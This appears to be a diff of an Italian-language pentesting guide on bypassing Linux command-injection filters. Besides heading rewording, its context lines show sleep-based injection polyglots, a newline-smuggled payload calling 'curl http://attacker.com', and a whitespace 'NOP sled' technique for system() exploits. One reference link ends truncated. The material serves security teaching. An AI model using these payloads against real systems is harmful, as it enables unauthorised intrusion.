@@ -202,7 +202,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Bypass potenziali regex
+### Bypassare potenziali regex
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -308,7 +308,7 @@ bypass-fs-protections-read-only-no-exec-distroless/
 ../privilege-escalation/escaping-from-limited-bash.md
 {{#endref}}
 
-## Bash NOP Sled Basato su Spazio ("Bashsledding")
+## NOP Sled Basato su Spazio ("Bashsledding")
 
 Quando una vulnerabilità ti consente di controllare parzialmente un argomento che alla fine raggiunge `system()` o un'altra shell, potresti non conoscere l'offset esatto in cui l'esecuzione inizia a leggere il tuo payload. I tradizionali NOP sled (ad es. `\x90`) **non** funzionano nella sintassi della shell, ma Bash ignorerà in modo innocuo gli spazi bianchi iniziali prima di eseguire un comando.
 
@@ -328,12 +328,12 @@ Casi d'uso pratici:
 
 > 🛠️  Combina questo trucco con gadget ROP che chiamano `system()` per aumentare drasticamente l'affidabilità dell'exploit su router IoT con memoria limitata.
 
-## Riferimenti e altro
+## Riferimenti e ulteriori informazioni
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju)
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
 
 - [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
